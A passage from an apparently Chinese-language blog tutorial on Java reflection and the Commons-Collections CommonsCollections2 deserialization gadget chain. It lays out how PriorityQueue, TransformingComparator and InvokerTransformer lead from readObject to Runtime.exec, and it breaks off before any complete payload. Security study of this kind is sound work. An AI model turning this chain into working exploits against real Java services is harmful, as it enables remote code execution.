class="token string">"javase.reflectBean.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>Modifier<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>studentClass<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" class "</span> <span class="token operator">+</span> studentClass<span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" {\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Class类的getName方法</span>        <span class="token comment" spellcheck="true">//获取所有的属性</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field f <span class="token operator">:</span> fields<span class="token punctuation">)</span><span class="token punctuation">{</span>            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号</span>            <span class="token comment" spellcheck="true">// 用Modifier类的toString转换成字符串</span>            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>Modifier<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取属性的类型</span>            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取属性的名字</span>            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">";\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="通过反射机制访问一个java对象的属性"><a href="#通过反射机制访问一个java对象的属性" class="headerlink" title="通过反射机制访问一个java对象的属性"></a>通过反射机制访问一个java对象的属性</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*必须掌握：    怎么通过反射机制访问一个java对象的属性？        给属性赋值set        获取属性的值get */</span><span class="token keyword">class</span> <span class="token class-name">ReflectTest07</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//不使用反射机制给属性赋值</span>        Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/**给属性赋值三要素：给s对象的no属性赋值1111         * 要素1：对象s         * 要素2：no属性         * 要素3：1111         */</span>        student<span class="token punctuation">.</span>no <span class="token operator">=</span> <span class="token number">1111</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/**读属性值两个要素：获取s对象的no属性的值。         * 要素1：对象s         * 要素2：no属性         */</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>no<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//使用反射机制给属性赋值</span>        Class <span class="token class-name">studentClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javase.reflectBean.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// obj就是Student对象。（底层调用无参数构造方法）</span>        <span class="token comment" spellcheck="true">// 获取no属性（根据属性的名称来获取Field）</span>        Field noField <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 给obj对象(Student对象)的no属性赋值</span>        <span class="token comment" spellcheck="true">/*            虽然使用了反射机制，但是三要素还是缺一不可：                要素1：obj对象                要素2：no属性                要素3：22222值            注意：反射机制让代码复杂了，但是为了一个“灵活”，这也是值得的。         */</span>        noField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">22222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 读取属性的值</span>        <span class="token comment" spellcheck="true">// 两个要素：获取obj对象的no属性的值。</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>noField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h4 id="set不可以访问私有属性"><a href="#set不可以访问私有属性" class="headerlink" title="set不可以访问私有属性"></a>set不可以访问私有属性</h4><p>需要打破封装<br>    public void setAccessible(boolean flag):默认false，设置为true为打破封装</p><pre class=" language-java"><code class="language-java">        <span class="token comment" spellcheck="true">// 可以访问私有的属性吗？</span>        Field nameField <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打破封装（反射机制的缺点：打破封装，可能会给不法分子留下机会！！！）</span>        <span class="token comment" spellcheck="true">// 这样设置完之后，在外部也是可以访问private的。</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 给name属性赋值</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"xiaowu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取name属性的值</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nameField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><pre><code>获取类的方法： forName获取函数的方法： getMethod实例化类对象的方法： newInstance执行函数的方法： invoke</code></pre><p>私有属性需要特殊的设置。</p><h2 id="CommonsCollections2链"><a href="#CommonsCollections2链" class="headerlink" title="CommonsCollections2链"></a>CommonsCollections2链</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在JDK1.8 8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写。导致高版本中利用链无法使用。<br>所以cc2版本就没用使用<code>AnnotationInvocationHandler</code>而时使用了<code>TemplatesImpI+PriorityQueue</code>来构造利用链的。<br><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个内置类, 这个类的骚操作就是,在调用他的<code>newTransformer</code>或者<code>getOutputProperties</code>(这个方法内部会调用<code>newTransformer</code>) 时,会动态从字节码中重建一个类。<br>这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>jdk没有版本限制，commons.collections4。</p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>dependency<span class="token operator">></span>    <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>commons<span class="token operator">-</span>collections4<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">4.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><p>用于写字节码的javaassist。</p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>dependency<span class="token operator">></span>    <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>javassist<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>javassist<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">3.25</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">-</span>GA<span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>官方的调用链：</p><pre class=" language-1"><code class="language-1">/*    Gadget chain:        ObjectInputStream.readObject()            PriorityQueue.readObject()                ...                    TransformingComparator.compare()                        InvokerTransformer.transform()                            Method.invoke()                                Runtime.exec() */</code></pre><p>ChainedTransformer之后就和commons collections1一样了。</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue,它的出队顺序与元素的优先级有关，对PriorityQueue调用remove()或poll()方法，返回的总是优先级最高的元素。<br>要使用PriorityQueue，我们就必须给每个元素定义“优先级”。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Queue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Queue<span class="token operator">&lt;</span>String<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"pear"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以<code>banana</code>、<code>pear</code>、<code>apple</code>的顺序输入，但是输出却是<code>apple</code>、<code>banana</code>、<code>pear</code> <code>null</code>，这是因为从字符串的排序看，a&gt;b&gt;p。<br><img src="https://kingofkb.github.io/medias/image/20220829/priorityqueue.png"><br>因此，放入PriorityQueue的元素，必须实现Comparable接口，PriorityQueue会根据元素的排序顺序决定出队的优先级。<br>构造Comparable自定义排序算法如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Queue<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Comparator<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc2</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">UserComparator</span> <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token operator">&lt;</span>User<span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>User u1<span class="token punctuation">,</span> User u2<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>u1<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span>u2<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> u1<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>u2<span class="token punctuation">.</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>u1<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'V'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">final</span> String name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">final</span> String number<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String number<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>number<span class="token operator">=</span>number<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> name<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>number<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Queue<span class="token operator">&lt;</span>User<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"V1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"pear"</span><span class="token punctuation">,</span> <span class="token string">"V2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"A1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220829/comparator.png"><br>我们需要对<code>PriorityQueue</code>利用点进行分析，直接进入它的<code>readObject</code>方法，可以看到最后调用<code>heapify</code>方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>    <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Read in size, and any hidden stuff</span>    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read in (and discard) array length</span>    s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read in all elements.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        queue<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Elements are guaranteed to be in "proper order", but the</span>    <span class="token comment" spellcheck="true">// spec has never explained what that might be.</span>    <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进heapify。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>size <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token function">siftDown</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进siftDown</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> E x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator <span class="token operator">!=</span> null<span class="token punctuation">)</span>        <span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">siftDownComparable</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在<code>comparator</code>不为空时调用<code>siftDownUsingComparator</code>，在其为空时，调用<code>siftDownComparable</code>。<br>看<code>siftDownUsingComparator</code>。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> E x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> half <span class="token operator">=</span> size <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;</span> half<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> child <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        Object c <span class="token operator">=</span> queue<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> child <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span> c<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            c <span class="token operator">=</span> queue<span class="token punctuation">[</span>child <span class="token operator">=</span> right<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> c<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>        k <span class="token operator">=</span> child<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>小补充一下知识点</p><pre class=" language-1"><code class="language-1"><< 左移运算符，size << 1,相当于size乘以2>> 右移运算符，size >> 1,相当于size除以2>>> 无符号右移，忽略符号位，空位都以0补齐</code></pre><p><code>siftDownUsingComparator</code>会调<code> comparator</code>的<code>compare()</code>方法来进行优先级的比较和排序。这样，反序列化之后的优先级队列，也拥有了顺序。</p><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>根据名字我们可以将这个理解为和TransformMap应该具有相同功能，上面对PriorityQueue的学习知道它会根据comparator进行一个优先级排序，那么这个就是来创建comparator的，我们可以将comparator中加入恶意代码进行命令执行即可。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformingComparator</span><span class="token operator">&lt;</span>I<span class="token punctuation">,</span> O<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token operator">&lt;</span>I<span class="token operator">></span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 3456940356043606220L<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Comparator<span class="token operator">&lt;</span>O<span class="token operator">></span> decorated<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Transformer<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> I<span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">O</span><span class="token operator">></span> transformer<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">TransformingComparator</span><span class="token punctuation">(</span>Transformer<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> I<span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">O</span><span class="token operator">></span> transformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> ComparatorUtils<span class="token punctuation">.</span>NATURAL_COMPARATOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">TransformingComparator</span><span class="token punctuation">(</span>Transformer<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> I<span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">O</span><span class="token operator">></span> transformer<span class="token punctuation">,</span> Comparator<span class="token operator">&lt;</span>O<span class="token operator">></span> decorated<span class="token punctuation">)</span> <span class="token punctuation">{</span>        